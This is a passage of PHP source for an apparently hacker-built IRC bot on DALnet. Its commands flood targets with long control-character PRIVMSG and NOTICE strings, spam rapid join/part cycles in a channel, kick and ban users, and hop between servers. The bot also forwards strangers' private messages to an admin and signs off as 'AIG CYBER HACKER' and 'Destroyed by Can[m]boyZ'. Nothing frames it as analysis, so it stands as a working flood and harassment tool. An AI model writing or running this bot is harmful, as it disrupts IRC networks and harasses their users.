F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%1F%7F%1F%7F%7F' . CRL);
							fputs($fp, 'PRIVMSG '.$com[4].' :%01OBRAK-ABRIK %02'.$msg.'%038,1:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@:)@_@(G)' . CRL);
							fputs($fp, 'NOTICE '.$com[4].' :%02'.$msg.'%039%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%0313%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.' . CRL);
							fputs($fp, 'PRIVMSG '.$com[4].' :%02'.$msg.'%038%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.%0311%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%1F%7F%16%02.' . CRL);
							if (ereg("#", $com[4])) {
					   		  fputs($fp, 'PART '.$com[4].' :%c%00,04AIG CYBER HACKER Complete' . CRL);
							  fputs($fp, 'NICK '.$nick . CRL);
							} else {
							fputs($fp, 'NICK '.$nick . CRL);
							}
						}
						elseif ($com[3]==':`cycle' && $chan && $login["$dNick"]["status"]!="user") {
							$msg = strstr($data,":`cycle");
							if (ereg("#", $com[4])) {
					   		  $partchan = $com[4];
							  $msg = str_replace(":`cycle $com[4]","",$msg);
							} else {
					   		  $partchan = $chan;
							  $msg = str_replace(":`cycle","",$msg);
							}
							if (strlen($msg)<3) {
							  $msg = '';
							}
							fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
							fputs($fp, 'JOIN '.$partchan . CRL);
						}
						elseif ($com[3]==':`p' && $login["$dNick"]["status"]=="Admin") {
							$msg = strstr($data,":`part");
							if (ereg("#", $com[4])) {
					   		  $partchan = $com[4];
							  $msg = str_replace(":`part $com[4]","",$msg);
							} else {
					   		  $partchan = $chan;
							  $msg = str_replace(":`part","",$msg);
							}
							if (strlen($msg)<3) {
							  $msg = '';
							}
							fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
							$remchan = strtolower($partchan);
							if (in_array($remchan, $channel)) {
								$channels = str_replace("$remchan ","",$channels);
								unset($channel);
								$channel = explode(" ", $channels);
							}
							foreach ($channel as $v) {
								fputs($fp, 'JOIN '.$v . CRL);
							}
						}
						elseif ($com[3]==':`j' && $com[4] && $login["$dNick"]["status"]=="Admin") {
							if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
							$addchan = strtolower($com[4]);
							if (!in_array($addchan, $channel)) {
								$channel[]=$addchan;
								$channels.="$addchan ";
							}
							foreach ($channel as $v) {
								sleep(rand(1,6));
								fputs($fp, 'JOIN '.$v . CRL);
							}
						}
						elseif ($com[3]==':`hop' && $com[4] && $login["$dNick"]["status"]=="Admin") {
						        $msg = strstr($data,":`hop");
						        if (ereg("#", $com[4])) {
						        $partchan = $com[4];
						        $msg = str_replace(":`hop $com[4]","",$msg);
						        }
						        else {
						        $partchan = $chan;
						        $msg = str_replace(":`hop","",$msg);
						        }
						        if (strlen($msg)<3) {
						        $msg = '';
						        }
						         fputs($fp, 'JOIN '.$partchan . CRL);
						         fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
						         fputs($fp, 'JOIN '.$partchan . CRL);
						         fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
							 fputs($fp, 'JOIN '.$partchan . CRL);
							 fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
							 fputs($fp, 'JOIN '.$partchan . CRL);
							 fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
							 fputs($fp, 'JOIN '.$partchan . CRL);
							 fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
							 fputs($fp, 'JOIN '.$partchan . CRL);
							 fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
							 fputs($fp, 'JOIN '.$partchan . CRL);
							 fputs($fp, 'PART '.$partchan.' :%02'.$msg . CRL);
						}
						elseif ($com[3]==':`n' && $com[4] && !$chan && $login["$dNick"]["status"]=="Admin") {
							$nick = $com[4];
							$identify = $com[5];
							fputs($fp, 'NICK '.$nick . CRL);
					     		fputs($fp, 'PRIVMSG nickserv@services.dal.net :identify '.$nick.' '.$identify.  CRL);
						}
						elseif ($com[3]==':`k' && $com[4] && $chan) {
							$msg = strstr($data,":`k");
							$msg = str_replace(":`k $com[4]","",$msg);
							fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
						}
						elseif ($com[3]==':`kb' && $com[4] && $chan) {
							$msg = strstr($data,":`kb");
							$msg = str_replace(":`kb $com[4]","",$msg);
							fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
							fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
						}
						elseif ($com[3]==':`nick') {
							$nick = $nicky[rand(0,count($nicky) - 1)];
							fputs($fp, 'NICK '.$nick . CRL);
							if (substr($dCommand,0,3)=='433') {
								$nick = $nicky[rand(0,count($nicky) - 1)];
								fputs($fp, 'NICK '.$nick . CRL);
							}
						}
						elseif ($com[3]==':`op' && $chan) {
							if ($com[4]) { $opnick = $com[4]; }
							else { $opnick = $dNick; }
							fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`deop' && $chan) {
							if ($com[4]) { $opnick = $com[4]; }
							else { $opnick = $dNick; }
							fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`v' && $chan) {
							if ($com[4]) { $vonick = $com[4]; }
							else { $vonick = $dNick; }
							fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`dv' && $chan) {
							if ($com[4]) { $vonick = $com[4]; }
							else { $vonick = $dNick; }
							fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
						}
						elseif ($com[3]==':`awaymsg' && $login["$dNick"]["status"]=="Admin") {
							$msg = strstr($data,":`awaymsg");
							$msg = str_replace(":`awaymsg","",$msg);
							if (strlen($msg)<3) {
							  $raway="on";
							  fputs($fp,'AWAY : ' . '%c%04,14Sistem Protected Away' . CRL);
							} else {
							  $raway="off";
							  fputs($fp,'AWAY : ' . $msg . CRL);
							}
						}
						elseif ($com[3]==':`mode' && $com[4] && $chan) {
							fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
						}
						elseif ($com[3]==':`nickmode' && $com[4]) {
							$nickmode = $com[4];
							fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
						}
						elseif ($com[3]==':`chanlist') {
							fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
						}
						elseif ($com[3]==':`userlist') {
							$userlist="";
							foreach ($login as $user) {
							  if ($user["pass"]) { $pass="-pass ok"; }
							  else { $pass="-no pass"; }
							  $userlist .= $user["name"].'('.$user["status"].$pass.') ';
							}
							fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
						}
						elseif ($com[3]==':`quit' && $login["$dNick"]["status"]=="Admin") {
							$msg = strstr($data,":`quit");
							$msg = str_replace(":`quit","",$msg);
							if (strlen($msg)>3) {
							  $msg = str_replace(" ","_",$msg);
							}
							$quit1 = array("Wassalam..","socket errors","Destroyed by Can[m]boyZ","http://canmboyz.jw.lt");
							$quitmsg = $quit1[rand(0,count($quit1) - 1)];
							fputs($fp, 'QUIT ' . $quitmsg . CRL);
							$keluar = 1;
							exit;
						}
						elseif ($com[3]==':`vhost' && $login["$dNick"]["status"]=="Admin") {
							if ($com[4]) { $localhost = $com[4]; }
							else { $localhost = 'localhost'; }
							$keluar = 0;
							fputs($fp, 'QUIT ' . CRL);
						}
						elseif ($com[3]==':`jump' && $login["$dNick"]["status"]=="Admin") {
							if (!eregi(".dal.net",$com[4])) {
							  $remotehost = "irc.dal.net";
							} else { $remotehost = $com[4]; }
							$keluar = 0;
							fputs($fp, 'QUIT changging_server' . CRL);
						}
                    					elseif ($com[3]==':`pindah' && $login["$dNick"]["status"]=="Admin") {
                     						 if (empty($com[4])) {
                        						   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
							} else { $remotehost = $com[4]; }
                      						$keluar = 0;
                      					fputs($fp, "QUIT Ganti_Server".CRL);
						}
						elseif ($com[3]==':`ident' && $login["$dNick"]["status"]=="Admin") {
							if (!$com[4]) {
							  $username = $username;
							} else { $username = $com[4]; }
							$keluar = 0;
							fputs($fp, 'QUIT ganti_ident' . CRL);
						}
						elseif ($com[3]==':`fullname' && $login["$dNick"]["status"]=="Admin") {
							if (!$com[4]) {
							  $realname = "--";
							} else { $realname = $com[4]; }
							$keluar = 0;
							fputs($fp, 'QUIT ganti_fullname' . CRL);
						}
						elseif ($com[3]==':`topic' && $com[4] && $chan) {
							$msg = strstr($data,":`topic");
							$msg = str_replace(":`topic ","",$msg);
							fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
						}
						elseif ($com[3]==':`help' && !$chan) {
							fputs($fp,'PRIVMSG '.$dNick.' :maaf code yang anda masukan salah' . CRL);
						}
					} else { fputs($fp,'NOTICE '.$dNick.' :login dulu bos! ketik: siap <password> '. CRL); }
				}
				}
				elseif (!$login["$dNick"] && !eregi("siap",$iText)) {
					if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
						if (!ereg("#",$dCommand)) {
							if ($log=="on") {
								fputs($fp,'PRIVMSG '. $Admin .' :%c%4inviter: ' . $dFrom . '%032:' .$iText. CRL);
							}
							$inv = strstr($dFrom,'@');
							foreach ($login as $user) {
								if ($user["status"]=="user") {
									fputs($fp, 'NOTICE '.$user["name"].' :%01KB '.$chan.' '.$dNick.' '.$inv.'%01' . CRL);
								}
							}
						}
					}
					elseif (!ereg("#",$dCommand)) {
						if ($log=="on") {
							fputs($fp,'PRIVMSG '.$Admin.' :%036' . $dFrom . '%0312:' .$iText. CRL);
						}
					}
				}
				}
			}
			elseif (substr($data,0,4) == 'PING') {
				fputs($fp,'PONG ' . substr($data,5) . CRL);
					$smile = $querym[rand(0,count($querym) - 1)];
					$kata1 = $usr1[rand(0,count($usr1) - 1)].$usr1[rand(0,count($usr1) - 1)].$usr1[rand(0,count($usr1) - 1)];
					$kata2 = $usr1[rand(0,count($usr1) - 1)].$usr1[rand(0,count($usr1) - 1)].$usr1[rand(0,count($usr1) - 1)];
					fputs($fp,'PRIVMSG #whatz :' . $kata1 . ' ' . $kata2 . $smile . CRL);
			}
		}
	}
	fclose ($fp);
} while ($keluar==0);
}
working($nick);
?>
 
 
 
 

